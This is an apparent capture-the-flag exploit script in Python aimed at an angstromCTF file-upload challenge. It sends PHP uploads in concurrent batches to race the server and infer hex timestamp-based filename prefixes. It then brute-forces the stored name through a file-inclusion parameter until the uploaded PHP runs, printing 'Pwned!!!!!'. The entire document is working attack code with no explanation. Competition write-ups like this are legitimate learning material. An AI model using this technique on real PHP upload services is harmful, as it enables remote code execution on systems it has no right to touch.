import re
import sys
import aiohttp
import asyncio
import requests
from aiohttp import FormData

URL = "https://filestore.web.actf.co/"

payload = open("satoki.php", "rb").read()

async def post(filename):
    async with aiohttp.ClientSession() as session:
        data = FormData()
        data.add_field("f", payload, filename=filename)
        async with session.post(URL, data=data) as response:
            return await response.text()

while True:
    try:
        loop = asyncio.get_event_loop()
        tasks = asyncio.gather(
            post(f"{'satoki'*30}.php"), 
            post("satoki.php"), 
            post("satoki.php"), 
            post("satoki.php"), 
            post(f"{'satoki'*30}.php"), 
        )
        res = loop.run_until_complete(tasks)

        start = int("0x" + re.search("uploads/([0-9a-f]*)_0d6fb", res[0]).group(1), 16)
        end = int("0x" + re.search("uploads/([0-9a-f]*)_0d6fb", res[-1]).group(1), 16)
        print(f"[{end - start}]")

        if -1 < end - start < 700:
            for i in range(end - start + 1):
                print(f"{i + 1}/{end - start + 1}")
                filename = f"{f'{hex(end - i)}'.replace('0x', '')}_5e0b2ce2b5586766a112f37e4ae49da5e9d7be72afaf1a29858ecc70ecc2f5be_satoki.php"
                try:
                    res = requests.get(f"https://filestore.web.actf.co?f={filename}").text
                except Exception as e:
                    print(f"ERROR: {e}")
                    continue
                if "No such file or directory" not in res:
                    print("Pwned!!!!!")
                    print(f"https://filestore.web.actf.co?f={filename}")
                    print(res)
                    sys.exit()
    except Exception as e:
        print(f"ERROR: {e}")
        continue